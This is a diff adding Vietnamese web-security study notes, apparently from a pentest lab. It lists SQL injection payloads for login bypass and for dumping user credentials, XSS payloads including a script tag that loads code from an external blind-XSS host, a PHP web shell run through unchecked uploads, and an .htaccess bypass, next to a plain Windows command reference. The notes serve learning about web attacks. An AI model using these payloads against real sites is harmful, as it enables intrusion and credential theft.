@@ -1,0 +1,153 @@
+- SQL INJECTION
+ - Tấn công vào login: 
+	+ password nhập: ' OR 1=1 ORDER BY id DESC -- -> Lấy user cuối -> bỏ qua mật khẩu
+ - Tấn công vào ô input tìm kiếm:
+	+ Lấy tất cả dánh sách bài có trong database: ' OR 1=1) --
+	+ Lấy các tên các bảng: ') UNION SELECT null, table_name, table_schema, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null FROM information_schema.tables -- 
+	') UNION SELECT id, username, password, null, null, null, null, null, null, null, null, null, email, null, null, null, null, email, null FROM users -- 
+- Tấn công XSS:
+	+ Tấn công trên att value của ô input: <input type="text" value="" onclick="alert(document.cookie)">
+	+ Tấn công XSS  qua các form báo cáo, hỗ trợ: https://xsshunter.trufflesecurity.com/app/#/,
+	Không validate dữ liệu, không escape html: <script src='https://js.rip/ngh39d94fh'></script> => Nhập vào form báo cáo
+
+- Upload file
+ - Không kiểm tra phần mở rộng file: có thể upload file php
+	+ Upload file php: thực hiện các lệnh
+		+dir: xem danh sách
+		+ tạo file mới: mkdir ..\uploads
+		+xóa forder/file: rmdir "C:\path\to\project\folder"
+	+ Upload file nhận biến system($_GET['cmd']);
+		+Whoami, 
+		Duyệt và thông tin thư mục / file
+
+		dir — liệt kê file/thư mục trong thư mục hiện tại.
+		Ví dụ: dir hoặc dir /a (hiện file ẩn).
+
+		cd (change directory) — chuyển thư mục.
+		Ví dụ: cd C:\Projects ; cd .. (lùi 1 cấp) ; cd\ (về root ổ đĩa).
+
+		md hoặc mkdir — tạo thư mục.
+		Ví dụ: mkdir newfolder
+
+		rmdir hoặc rd — xóa thư mục rỗng.
+		Ví dụ: rmdir foldername ; rmdir /S foldername (xóa thư mục và nội dung).
+
+		del — xóa file.
+		Ví dụ: del file.txt ; del /F /Q file.txt (/F: bắt buộc, /Q: không hỏi).
+
+		copy — sao chép file.
+		Ví dụ: copy file.txt C:\Backup\file.txt
+
+		move — di chuyển/đổi tên file hoặc thư mục.
+		Ví dụ: move old.txt newfolder\newname.txt
+
+		ren hoặc rename — đổi tên file/thư mục.
+		Ví dụ: ren oldname.txt newname.txt
+
+		Xem nội dung file / tìm kiếm
+
+		type — hiển thị nội dung file văn bản.
+		Ví dụ: type readme.txt
+
+		more — xem nội dung theo trang (kết hợp type): type bigfile.txt | more
+
+		find — tìm chuỗi trong file(s).
+		Ví dụ: find "error" log.txt
+
+		findstr — tìm kiếm regex/chuỗi trong file (mạnh hơn).
+		Ví dụ: findstr /I "error warning" *.log (/I không phân biệt hoa thường)
+
+		Thông tin hệ thống & quản trị
+
+		systeminfo — thông tin hệ thống chi tiết (Windows version, RAM, v.v.)
+
+		tasklist — liệt kê tiến trình đang chạy.
+		Ví dụ: tasklist
+
+		taskkill — dừng tiến trình.
+		Ví dụ: taskkill /PID 1234 /F hoặc taskkill /IM notepad.exe /F
+
+		ipconfig — thông tin cấu hình mạng.
+		Ví dụ: ipconfig ; ipconfig /all ; ipconfig /release ; ipconfig /renew
+
+		ping — kiểm tra kết nối tới host.
+		Ví dụ: ping google.com
+
+		tracert — theo dõi đường đi tới host.
+		Ví dụ: tracert google.com
+
+		netstat — hiển thị kết nối mạng, cổng mở.
+		Ví dụ: netstat -ano (thêm PID)
+
+		nslookup — tra DNS.
+		Ví dụ: nslookup example.com
+
+		sfc /scannow — System File Checker, quét và sửa file hệ thống.
+
+		chkdsk — kiểm tra ổ đĩa.
+		Ví dụ: chkdsk C: /F (sửa lỗi)
+
+		Quản lý đĩa / phân vùng
+
+		diskpart — công cụ quản lý đĩa (interactive, mạnh, cẩn thận).
+		Ví dụ: gõ diskpart rồi dùng các lệnh bên trong.
+
+		format — định dạng phân vùng/USB.
+		Ví dụ: format E: /FS:NTFS (rất nguy hiểm — sao lưu trước).
+
+		Mạng & chia sẻ
+
+		net use — map/đóng map ổ mạng.
+		Ví dụ: net use Z: \\server\share /user:DOMAIN\user
+
+		net start / net stop — start/stop dịch vụ.
+		Ví dụ: net stop wuauserv
+
+		netstat — như trên, hiển thị port, kết nối
+
+		Biến môi trường, batch và tiện ích
+
+		set — hiển thị hoặc thiết lập biến môi trường trong session.
+		Ví dụ: set PATH ; set MYVAR=123
+
+		echo — in ra dòng.
+		Ví dụ: echo Hello ; echo %PATH%
+
+		pause — tạm dừng và chờ key (dùng trong batch file).
+
+		cls — xóa màn hình console.
+
+		help hoặc command /? — xem trợ giúp cho lệnh.
+		Ví dụ: dir /?
+
+		start — mở cửa sổ mới hoặc mở file bằng ứng dụng mặc định.
+		Ví dụ: start notepad ; start "" "C:\path\file.pdf"
+
+		assoc / ftype — quản lý associations file -> chương trình.
+
+		Nâng cao & an toàn
+
+		whoami — hiển thị user hiện tại.
+
+		runas — chạy lệnh với user khác (cần password).
+		Ví dụ: runas /user:Administrator "cmd.exe"
+
+		icacls — thay đổi quyền NTFS.
+		Ví dụ: icacls C:\path /grant "%USERNAME%:M"
+
+		schtasks — quản lý task scheduler.
+		Ví dụ: schtasks /Create /SC daily /TN "MyTask" /TR "C:\script.bat" /ST 09:00
+	- Chỉ loại bỏ ext .php => nghi ngờ dùng hàm str_replace => tìm cách sao có thể upload được file .php
+
+	- Nếu không đổi tên file. Có thể dùng cách chỉnh sửa caauss hình file .htaccess => apache xử lí file png như file php
+	- Dùng burp suite sửa đổi nội dung file images
+	- Đầu tiên tải file .cookie
+	- tải file .htaccess có nội dung: AddHandler application/x-httpd-php .php .
+
+- CSRF
+ - Tấn công thay đổi mật khẩu khi người dùng đã đăng Nhập
+	+ Một trang web không xác nhận mk hiện tại, không validate dữ liệu, không chống CSRF
+	+ Một trang có xác nhận mk cũ, có validate dữ liệu, có CSRF token
+- Broken Authencation
+ - Không cho truy cập tài nguyên không phải của mình
+ - Không phân quyền, truy cập các trang quá vai trò của mình
